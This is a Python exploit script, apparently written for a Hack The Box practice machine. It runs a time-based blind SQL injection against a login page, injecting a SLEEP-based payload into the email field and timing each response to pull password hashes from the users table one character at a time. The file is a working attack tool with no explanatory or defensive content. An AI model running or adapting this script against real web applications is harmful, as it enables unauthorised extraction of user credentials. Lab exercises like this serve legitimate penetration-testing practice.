#!/usr/bin/python3

from pwn import *

import requests
import sys
import signal
import time
import pdb
from scapy.all import *
from termcolor import colored
import string
import urllib3

urllib3.disable_warnings()

# Ctrl+C
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


def def_handler(sig, frame):
    print(colored(f"\n[!] Exiting the script!\n", 'red'))
    p1.failure(colored(f"Injection aborted (Ctrl + c pressed)", 'red'))
    sys.exit(1)

# CTRL + c
signal.signal(signal.SIGINT, def_handler)
p1 = log.progress("SQLi Brute-Force Exploit")
p1.status("Sending Injection...")

# Global Variables
login_url = 'https://admin-portal.europacorp.htb/login.php'
characters = string.digits + "abcdef"

def makeSQLI():
    s = requests.session()
    s.verify = False
    
    #p1 = log.progress("SQLi Europa Exploit")
    #p1.status("Sending Injection...")
    time.sleep(2)

    p2 = log.progress("Dump Passwords")
    dump_hashes = ""

    #for cls in range(0, 5):
    for position in range(1, 50):
        for character in characters:
            post_data = {
                'email': "admin@europacorp.htb' and if(substr((select group_concat(password) from users),%d,1)='%s',sleep(5),1);-- -" % (position, character),
                'password': 'f00'
            }
            p1.status(post_data['email'])

            time_start = time.time()
            r = s.post(login_url, data=post_data)
            time_end = time.time()

            if time_end - time_start > 5:
                # print("\n[+] This CHAR '%s' is correct" % character)
                # sys.exit(0)
                dump_hashes += character
                p2.status(dump_hashes)
                break
        
    #dump_hashes += ", "




if __name__ == '__main__':
    makeSQLI()
    #sleep(20)